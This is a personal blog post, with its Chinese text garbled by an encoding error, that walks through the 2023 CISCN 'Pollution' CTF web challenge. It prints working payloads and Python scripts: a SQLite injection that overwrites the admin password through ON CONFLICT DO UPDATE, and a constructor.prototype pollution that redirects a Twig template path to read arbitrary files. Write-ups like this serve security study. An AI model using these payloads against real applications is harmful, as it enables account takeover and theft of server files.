<!DOCTYPE html>
<html lang="en" class="light">
<head>
  <meta charset="utf-8">
  
  <title>
    
    2023_CISCN_Pollution
    
  </title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="icon" href="/favicon.svg" type="image/svg+xml" />
  <link rel="me" href="https://mas.uniiem.com/@mizore" />
  
<script src="https://cdn.staticfile.org/prism/1.17.1/prism.min.js"></script>

  
<script src="https://cdn.staticfile.org/prism/1.17.1/plugins/autoloader/prism-autoloader.min.js"></script>

  
<link rel="stylesheet" href="/css/prism/material-light.css">

  
<link rel="stylesheet" href="/css/prism/material-dark.css">

  
<script src="https://cdn.staticfile.org/prism/1.17.1/plugins/line-numbers/prism-line-numbers.min.js"></script>

  
<link rel="stylesheet" href="https://cdn.staticfile.org/prism/1.17.1/plugins/line-numbers/prism-line-numbers.min.css">

  
<link rel="stylesheet" href="/css/style.css">

  
<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono&family=Noto+Sans+SC:wght@300&display=swap.css">

  
<link rel="stylesheet" href="/iconfont/iconfont.css">

<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Welcome to s4mmy's blog" type="application/atom+xml">
</head>
<script>
  function setIsNight(isNight) {
    localStorage.setItem('isNight', isNight)
  }

  function getIsNight() {
    return localStorage.getItem('isNight')
  }

  function switchTheme() {
    let isNight = getIsNight()
    if (isNight === 'false') {
      document.documentElement.className = 'dark'
      document.getElementsByClassName('theme-switcher')[0].textContent = 'ğŸŒ™'
      setIsNight('true')
    } else {
      document.documentElement.className = 'light'
      document.getElementsByClassName('theme-switcher')[0].textContent = 'ğŸŒ'
      setIsNight('false')
    }
  }

  let isNight = getIsNight()
  if (isNight == null) {
    isNight = 'false'
    setIsNight('false')
  }
  if (isNight === 'false') {
    document.documentElement.className = 'light'
  } else {
    document.documentElement.className = 'dark'
  }
</script>

<body>
  <div class="show-area">
    <header>
  <ul class="nav">
    <li class="nav-child">
      <a href="/">é¦–é¡µ</a>
    </li>
    <li class="nav-child">
      <a href="/categories">åˆ†ç±»</a>
    </li>
    <li class="nav-child">
      <a href="/tags">æ ‡ç­¾</a>
    </li>
    <li class="nav-child">
      <a href="/about">å…³äº</a>
    </li>
    <li class="nav-child">
      <a href="/collection">æ”¶è—</a>
    </li>
    <li class="nav-child">
      <a href="/board">ç•™è¨€</a>
    </li>
  </ul>
  <div class="theme-switcher" onclick="switchTheme()">ğŸŒ</div>
  <script>
    if (isNight === 'false') {
      document.getElementsByClassName('theme-switcher')[0].textContent = 'ğŸŒ'
    } else {
      document.getElementsByClassName('theme-switcher')[0].textContent = 'ğŸŒ™'
    }
  </script>
</header>
    <main class="main-body">
  <div class="toc-container">
    <div class="toc-toggle">
      <i id="toc-b-icon" class="iconfont icon-liebiao-01" onclick="toggleShow()"></i>
    </div>
    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#2023-CISCN-Pollution"><span class="toc-number">1.</span> <span class="toc-text">2023_CISCN_Pollution</span></a></li></ol>
  </div>
  
  <script>
    var show = false
    function toggleShow() {
      if (show) {
        document.getElementsByClassName('toc')[0].className = 'toc'
        document.getElementById('toc-b-icon').className = 'iconfont icon-liebiao-01'
      } else {
        document.getElementsByClassName('toc')[0].className = 'toc show'
        document.getElementById('toc-b-icon').className = 'iconfont icon-quxiao-01'
      }
      show = !show
    }
    document.getElementsByClassName('toc')[0].onclick = toggleShow
  </script>
  
  <div class="article-header">
    <h1 class="article-title">2023_CISCN_Pollution</h1>
    <div class="article-details">
      <div class="article-post-date"><span>Posted at </span> 2023-06-24</div>
      <div class="article-tags">
        
      </div>
    </div>
  </div>
  <div class="article">
  
  <h2 id="2023-CISCN-Pollution"><a href="#2023-CISCN-Pollution" class="headerlink" title="2023_CISCN_Pollution"></a>2023_CISCN_Pollution</h2><p>å¼€å±€ç»å…¸ç™»å½•æ¡†ï¼Œä¸€é¡¿çè¯•ã€‚æŸ¥çœ‹æºç å¯ä»¥çŒœæµ‹æ˜¯ä½¿ç”¨sqlæ³¨å…¥ï¼Œåæ¥ä¸»åŠæ–¹ä¹Ÿæ˜¯æé†’äº†åœ¨æ³¨å†Œå¤„å­˜åœ¨sqlæ³¨å…¥ã€‚</p>
<p>ç»è¿‡æ³¨å†Œç™»å½•æµ‹è¯•å¯ä»¥çŒœåˆ°ç¬¬ä¸€æ­¥æ˜¯éœ€è¦è·å¾—adminçš„å¯†ç ã€‚</p>
<p>åœ¨<code>app.js</code>é‡Œå¯ä»¥çœ‹åˆ°ä¸‹åˆ—sqlè¯­å¥</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">db.all(&quot;SELECT * FROM users WHERE username&#x3D;? AND password&#x3D;?&quot;,[username,password],function(err,result)

db.get(&quot;SELECT * FROM users WHERE username&#x3D;?&quot;, [username], function(err, row)

let query &#x3D; &#96;INSERT INTO users (username, password) VALUES (&#39;$&#123;username&#125;&#39;, &#39;$&#123;utils.md5(password)&#125;&#39;)&#96;</code></pre>

<p>å¯ä»¥çœ‹åˆ°å‰ä¸¤å¥éƒ½è¿›è¡Œäº†é¢„ç¼–è¯‘ï¼Œæ‰€ä»¥æ— æ³•è¿›è¡Œæ³¨å…¥ï¼Œæˆ‘ä»¬æŠŠé‡ç‚¹æ”¾åˆ°ç¬¬ä¸‰å¥ä¸Šã€‚éå¸¸ç®€å•çš„å•å¼•å·é—­åˆï¼Œå¯¹äºæˆ‘æ¥è¯´éš¾ç‚¹å°±åœ¨è¿™é‡Œä½¿ç”¨çš„æ˜¯SQLiteè¿›è¡Œæ³¨å…¥ï¼Œå½“æ—¶åœ¨æ¯”èµ›çš„æ—¶å€™è¿˜æ²¡æ¥è§¦è¿‡è¿™ç±»çš„sqlæ³¨å…¥ã€‚ã€‚ã€‚ç”¨sqlmapç¡¬è·‘æ²¡è·‘å‡ºæ¥ã€‚</p>
<p>å®Œæ•´sqlæŸ¥è¯¢ä»£ç å¦‚ä¸‹</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">let query &#x3D; &#96;INSERT INTO users (username, password) VALUES (&#39;$&#123;username&#125;&#39;, &#39;$&#123;utils.md5(password)&#125;&#39;)&#96;;
            db.run(query,function(err)&#123;
              if(err)&#123;
                console.error(err)
                return res.send(&quot;&lt;script&gt;alert(&#39;Error!&#39;);window.location.href&#x3D;&#39;&#x2F;register&#39;&lt;&#x2F;script&gt;&quot;);
              &#125;else&#123;
                return res.send(&quot;&lt;script&gt;alert(&#39;Register successed&#39;);window.location.href&#x3D;&#39;&#x2F;login&#39;&lt;&#x2F;script&gt;&quot;);
              &#125;</code></pre>

<p>å¯ä»¥çœ‹åˆ°å¯¹äºè¯­å¥æ‰§è¡Œé”™è¯¯æˆ–è€…æˆåŠŸä¼šç»Ÿä¸€è¾“å‡º<code>Error</code>æˆ–è€…<code>success</code>ï¼Œæ‰€ä»¥è¿™é‡Œæ²¡åŠæ³•ä½¿ç”¨æŠ¥é”™æ³¨å…¥æˆ–è€…ç›´æ¥è”åˆæŸ¥è¯¢æ‹–åº“ç­‰æŸ¥çœ‹adminå¯†ç ã€‚</p>
<p>è¿™é‡Œçš„çªç ´ç‚¹æ˜¯ç›´æ¥ä½¿ç”¨UPDATEè¯­å¥æ¥æ›´æ–°adminçš„å¯†ç ã€‚</p>
<p>ç»è¿‡æµ‹è¯•å¸¸è§„çš„UPDATEè¯­å¥æ²¡åŠæ³•ç›´æ¥æ›´æ–°ç”¨æˆ·çš„å¯†ç ï¼Œè¿™é‡Œä½¿ç”¨sqlliteé‡Œçš„å¦ä¸€å¥æ›´æ–°æ•°æ®çš„è¯­å¥</p>
<pre class="line-numbers language-none"><code class="language-none">.....on CONFLICT DO.....</code></pre>

<p>æ‰€ä»¥æ„é€ å¦‚ä¸‹æ³¨å…¥è¯­å¥</p>
<pre class="line-numbers language-none"><code class="language-none">admin&#39;, &#39;md5(123456)&#39;) on CONFLICT DO UPDATE password &#x3D; &#39;md5(123456)&#39; --+</code></pre>

<p>æ®æ­¤å¯ä»¥ä½¿ç”¨pythonå†™å‡ºå¦‚ä¸‹è„šæœ¬</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">def SQLinjection(url):
    url&#x3D;f&#39;&#123;url&#125;&#x2F;register&#39;
    passwd&#x3D;&#39;123456&#39;
    hash&#x3D;passwd.encode(&#39;UTF-8&#39;)
    data&#x3D;&#123;
        &quot;username&quot;:f&quot;admin&#39;,&#39;&#123;md5.md5(hash).hexdigest()&#125;&#39;) on CONFLICT DO UPDATE SET password&#x3D;&#39;&#123;md5.md5(hash).hexdigest()&#125;&#39; --+&quot;,
        &quot;password&quot;:&quot;123456&quot;
    &#125;
    res&#x3D;s.post(url&#x3D;url,data&#x3D;data)
    if res.status_code &#x3D;&#x3D; 200 :
        print(&quot;injected successfully!\n&quot;,res.content)
    else:
        print(&quot;injected failed&quot;)
if __name__ &#x3D;&#x3D; &#39;__main__&#39;:
    url&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1:80&quot;
    SQLinjection(url)</code></pre>



<p>æ³¨å…¥æˆåŠŸåå°±è¿›å…¥<code>/admin</code>é¡µé¢äº†ï¼Œç„¶è€Œwebé¡µé¢ä»€ä¹ˆéƒ½æ²¡æœ‰ã€‚å¼€å§‹å®¡è®¡æºç ã€‚</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">app.all(&quot;&#x2F;admin&quot;,utils.checkIsAdmin,function(req,res,next)&#123;
  if(req.method &#x3D;&#x3D; &quot;GET&quot;)&#123;
    return res.render(&#39;home&#39;,&#123;&#39;username&#39;:req.session.username&#125;)
  &#125;
  if(req.method &#x3D;&#x3D; &quot;POST&quot;)&#123;
    var Info &#x3D;&#123;
      &quot;username&quot;:&quot;admin&quot;,
      &quot;message&quot;:&quot;Try2HackMe!&quot;
    &#125;
    try&#123;
      utils.extend(Info, req.body);
      return res.render(&#39;admin&#39;, &#123;&quot;username&quot;: Info.username, &quot;message&quot;: Info.message&#125;);
    &#125;catch(err)&#123;
      return res.send(&quot;&lt;script&gt;alert(&#39;Error!&#39;);window.location.href&#x3D;&#39;&#x2F;admin&#39;&lt;&#x2F;script&gt;&quot;);
    &#125;
  &#125;
&#125;)</code></pre>

<p>å®šä½åˆ°<code>utils.extend</code>åœ¨<code>utils.js</code>ä¸­æŸ¥çœ‹æºç </p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">static extend(target) &#123;
        for (var i &#x3D; 1; i &lt; arguments.length; i++) &#123;
            var source &#x3D; arguments[i]
            
            for (var key in source) &#123;
                if (key &#x3D;&#x3D;&#x3D; &#39;__proto__&#39;) &#123;
                    return;
                &#125;
                if (hasOwnProperty.call(source, key)) &#123;
                    if (key in source &amp;&amp; key in target) &#123;
                        Utils.extend(target[key], source[key])
                    &#125; else &#123;
                        target[key] &#x3D; source[key]
                    &#125;
                &#125;
            &#125;
        &#125;
        return target
    &#125;</code></pre>

<p>å¾ˆå…¸å‹çš„é€’å½’è°ƒç”¨åˆå¹¶å‡½æ•°ã€‚è‡³æ­¤å¯ä»¥åˆ¤æ–­ä¸‹ä¸€æ­¥çš„åˆ©ç”¨ç‚¹æ˜¯åŸå‹é“¾æ±¡æŸ“ã€‚</p>
<p>åŒæ—¶å¯ä»¥çœ‹åˆ°åœ¨<code>__proto__</code>å±æ€§è¢«è¿‡æ»¤äº†ï¼Œè¿™é‡Œä½¿ç”¨<code>constructor.prototype</code>è¿›è¡Œç»•è¿‡ã€‚</p>
<p>ç°åœ¨æŠŠé‡ç‚¹æ”¾åœ¨<code>entxend</code>å‡½æ•°åé¢çš„<code>render</code>å‡½æ•°é‡Œé¢ã€‚è®¾ç½®debugè¿›è¡Œé€è¡Œå®¡è®¡ã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">utils.js-&gt;render()
response.js-&gt;app.render()
application-&gt;view.render()
twig.js-&gt;Twig.exports.twig()
twig.js-&gt;Twig.Templates.loadRemote()
twig.js-&gt;Twig.Templates.loadRemote()</code></pre>

<p>é¦–å…ˆæ˜¯è¿›å…¥response.jsé‡Œçš„res.render()å‡½æ•°,è¿™é‡Œçš„æ“ä½œå°±æ˜¯å¯¹ä¸€äº›æ•°æ®è¿›è¡Œäº†èµ‹å€¼ã€‚</p>
<p>æ¥ç€è¿›å…¥åˆ°äº†application.jsé‡Œçš„app.render()é‡Œï¼Œä¹Ÿæ˜¯å¯¹ä¸€äº›æ•°æ®è¿›è¡Œäº†èµ‹å€¼ã€‚</p>
<p>æ¥ç€è¿›å…¥åˆ°äº†application.jsé‡Œçš„this.set(path)</p>
<p>åœ¨view.jsé‡Œè®¾ç½®äº†fileNameå€¼ä¸ºå˜é‡nameçš„å€¼ï¼Œå³<code>admin</code></p>
<p>æ¥ç€åœ¨è¿™é‡Œ</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">if (!this.ext) &#123;
   &#x2F;&#x2F; get extension from default engine name
   this.ext &#x3D; this.defaultEngine[0] !&#x3D;&#x3D; &#39;.&#39;
     ? &#39;.&#39; + this.defaultEngine
     : this.defaultEngine;

   fileName +&#x3D; this.ext;
 &#125;</code></pre>

<p>fileNameè¢«è®¾ç½®ä¸ºäº†<code>admin.twig</code></p>
<p>æ¥ç€è¿˜æ˜¯åœ¨view.jsé‡Œä¼šè°ƒç”¨lookupæ–¹æ³•ï¼Œæ ¹æ®æ–‡ä»¶å<code>admin.twig</code>æŸ¥æ‰¾å¹¶è®¾ç½®<code>path</code>å€¼</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">&#x2F;&#x2F; lookup path
this.path &#x3D; this.lookup(fileName);</code></pre>

<p>ç„¶ååˆè·³åˆ°äº†application.jsé‡Œçš„view.render()é‡Œé¢</p>
<p>æ¥ç€åˆ°twig.jsé‡Œçš„<code>Twig.exports.renderFile()</code>ï¼Œç„¶åæ˜¯Twig.exports.twig(params),è¿™é‡Œçš„ä½œç”¨æ˜¯åŠ è½½æ¸²æŸ“twigæ¨¡æ¿å¹¶è¾“å‡ºã€‚</p>
<p>è¿›å…¥<code>Twig.exports.renderFile()</code>åæ˜¾ç¤ºå¯¹paramsçš„å„ä¸ªå‚æ•°è¿›è¡Œåˆ¤æ–­</p>
<p>ç”±äºåœ¨ä¸Šé¢æˆ‘ä»¬çŸ¥é“äº†pathå€¼å·²ç»è¢«è®¾ç½®ä¸ºäº†<code>admin.twig</code>æ‰€ä»¥è¿™é‡Œä¼šè¿›å…¥åˆ¤æ–­ï¼ŒåŒæ—¶è¦æ³¨æ„è¿™é‡Œä¼ å…¥çš„paramså¯¹è±¡å·²ç»æ²¡æœ‰äº†pathå±æ€§ã€‚</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">if (params.path !&#x3D;&#x3D; undefined) &#123;
      return Twig.Templates.loadRemote(params.path, &#123;
        id: id,
        method: &#39;fs&#39;,
        parser: params.parser || &#39;twig&#39;,
        base: params.base,
        module: params.module,
        precompiled: params.precompiled,
        async: params.async,
        options: options
      &#125;, params.load, params.error);
    &#125;
  &#125;; &#x2F;&#x2F; Extend Twig with a new filter.</code></pre>

<p>æ¥ç€æ˜¯<code>loadRemote</code>å‡½æ•°</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">Twig.Templates.loadRemote &#x3D; function (location, params, callback, errorCallback) &#123;
    &#x2F;&#x2F; Default to the URL so the template is cached.
    var id &#x3D; typeof params.id &#x3D;&#x3D;&#x3D; &#39;undefined&#39; ? location : params.id;
    var cached &#x3D; Twig.Templates.registry[id]; &#x2F;&#x2F; Check for existing template

    if (Twig.cache &amp;&amp; typeof cached !&#x3D;&#x3D; &#39;undefined&#39;) &#123;
      &#x2F;&#x2F; A template is already saved with the given id.
      if (typeof callback &#x3D;&#x3D;&#x3D; &#39;function&#39;) &#123;
        callback(cached);
      &#125; &#x2F;&#x2F; TODO: if async, return deferred promise


      return cached;
    &#125; &#x2F;&#x2F; If the parser name hasn&#39;t been set, default it to twig


    params.parser &#x3D; params.parser || &#39;twig&#39;;
    params.id &#x3D; id; &#x2F;&#x2F; Default to async

    if (typeof params.async &#x3D;&#x3D;&#x3D; &#39;undefined&#39;) &#123;
      params.async &#x3D; true;
    &#125; &#x2F;&#x2F; Assume &#39;fs&#39; if the loader is not defined


    var loader &#x3D; this.loaders[params.method] || this.loaders.fs;
    return loader.call(this, location, params, callback, errorCallback);
  &#125;; &#x2F;&#x2F; Determine object type</code></pre>

<p>è¿™è¾¹æ˜¯é€šè¿‡paramsçš„idæ¥åŠ è½½æ¨¡ç‰ˆã€‚locationå˜é‡æ­£å¥½æ˜¯ä¸Šé¢ä¼ å…¥çš„<code>params.path</code>ï¼Œä¸”params.idä¸ºéç©ºï¼Œæ‰€ä»¥è¿™é‡Œæ˜¯é€šè¿‡<code>params.id</code>æ¥åŠ è½½æ¨¡æ¿ã€‚è€Œåœ¨ä¸Šé¢çš„ä»£ç ä¸­ï¼Œidçš„å€¼ä¹Ÿæ­£å¥½æ˜¯pathçš„å€¼ã€‚</p>
<p><img src="/img/2023ciscn/1.png"></p>
<p>æ¥ç€ä¼šé€šè¿‡callå‡½æ•°ä¼šè°ƒç”¨åˆ°<code>registerLoader</code>å‡½æ•°</p>
<p><code>registerLoader</code>å‡½æ•°æˆ‘ä»¬å¯ä»¥å…³æ³¨ä¸‹é¢è¿™ä¸€æ¡</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">if (precompiled &#x3D;&#x3D;&#x3D; true) &#123;
        data &#x3D; JSON.parse(data);
      &#125;

      params.data &#x3D; data;
      params.path &#x3D; params.path || location; &#x2F;&#x2F; Template is in data
</code></pre>

<p>å› ä¸ºåœ¨ä¹‹å‰paramsçš„pathå±æ€§å·²ç»è¢«é”€æ¯ï¼Œè¿™é‡Œé»˜è®¤æ˜¯locationçš„è·¯å¾„ã€‚æ‰€ä»¥è¿™é‡Œå¯ä»¥æ¨æµ‹å‡ºä¸€æ¡åˆ©ç”¨é“¾ï¼Œé€šè¿‡åŸå‹é“¾æ±¡æŸ“æ¥æ§åˆ¶pathå±æ€§ä»è€Œè¯»å–ä»»æ„æ–‡ä»¶ã€‚</p>
<p>æ‰€ä»¥åŸå‹é“¾å¯ä»¥æŒ‰å¦‚ä¸‹æ ¼å¼è¿›è¡Œæ„é€ </p>
<pre class="line-numbers language-none"><code class="language-none">&#123;&quot;constructor&quot;:&#123;&quot;protoytpe&quot;:&#123;&quot;path&quot;:&quot;flagè·¯å¾„&quot;&#125;&#125;&#125;</code></pre>

<p>æ ¹æ®ä¸Šé¢çš„åˆ†æå¯ä»¥ç¼–å†™ä»¥ä¸‹è„šæœ¬</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">![2](images&#x2F;2.png)import requests
import hashlib as md5
import json

s&#x3D;requests.session()
url&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1&quot;
def SQLinjection(url):
    url&#x3D;f&#39;&#123;url&#125;&#x2F;register&#39;
    passwd&#x3D;&#39;123456&#39;
    hash&#x3D;passwd.encode(&#39;UTF-8&#39;)
    data&#x3D;&#123;
        &quot;username&quot;:f&quot;admin&#39;,&#39;&#123;md5.md5(hash).hexdigest()&#125;&#39;) on CONFLICT DO UPDATE SET password&#x3D;&#39;&#123;md5.md5(hash).hexdigest()&#125;&#39; --+&quot;,
        &quot;password&quot;:&quot;123456&quot;
    &#125;
    res&#x3D;s.post(url&#x3D;url,data&#x3D;data)
    if res.status_code &#x3D;&#x3D; 200 :
        print(&quot;injected successfully!\n&quot;,res.content)
    else:
        print(&quot;injected failed&quot;)
if __name__ &#x3D;&#x3D; &#39;__main__&#39;:
    url&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1:80&quot;
    SQLinjection(url)

#å¿˜è®°å†™ç™»å½•çš„é€»è¾‘äº†
def Login(url):#è·å–ç™»å½•session
    url&#x3D;f&#39;&#123;url&#125;&#x2F;login&#39;
    data&#x3D;&#123;
        &quot;username&quot;:&quot;admin&quot;,
        &quot;password&quot;:&quot;123456&quot;
    &#125;
    res&#x3D;s.post(url&#x3D;url,data&#x3D;data)
    if res.status_code &#x3D;&#x3D; 200:
        print(&quot;Login successful&quot;)
    else:
        print(&quot;Login failed&quot;)



def pollution(url):
    url&#x3D;f&#39;&#123;url&#125;&#x2F;admin&#39;
    data&#x3D;&#123;&quot;constructor&quot;:&#123;&quot;prototype&quot;:&#123;&quot;path&quot;:&quot;&#x2F;Users&#x2F;sammy&#x2F;Desktop&#x2F;ä¸´æ—¶é¢˜ç›®æ–‡ä»¶å¤¹&#x2F;pollute&#x2F;flag.txt&quot;&#125;&#125;
    &#125;
    data&#x3D;json.dumps(data)
    res&#x3D;s.post(url&#x3D;url,data&#x3D;data,headers&#x3D;&#123;&quot;Content-Type&quot;:&quot;application&#x2F;json&quot;&#125;)
    if res.status_code &#x3D;&#x3D; 200:
        print(&quot;polluted successfully\n&quot;,res.content)
    else:
        print(&quot;polluted failed\n&quot;)

if __name__ &#x3D;&#x3D; &#39;__main__&#39;:
    SQLinjection(url)
    Login(url)
    pollution(url)</code></pre>

<p>è·å¾—flag</p>
<p><img src="/img/2023ciscn/2.png"></p>
<p>å‚è€ƒæ–‡ç« ï¼škentoå¸ˆå‚…çš„å¤ç°wp</p>

</div>
  <o3o key="mizore" api="https://o3o.mizore.site:2333"></o3o>
  
<script src="/o3o/o3o.js"></script>

  
<link rel="stylesheet" href="/css/o3o.css">

</main>
    <footer>
  <div class="footer-info"> Powerd by <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> | Theme <a
      target="_blank" rel="noopener" href="https://github.com/mizoreyo/hexo-theme-insnow">Insnow</a> </div>
  <div class="footer-info">
    <a class="footer-i" href=""><i class="iconfont icon-wechat"></i></a>
    <a class="footer-i" target="_blank" rel="noopener" href="https://github.com/sammyLingsj"><i class="iconfont icon-github-fill"></i></a>
    <a class="footer-i" href="/atom.xml"><i class="iconfont icon-rss"></i></a>
    <a class="footer-i" href="mailto:sammyLinsj@outlook.com"><i class="iconfont icon-mail"></i></a>
  </div>
</footer>
  </div>
</body>


</html>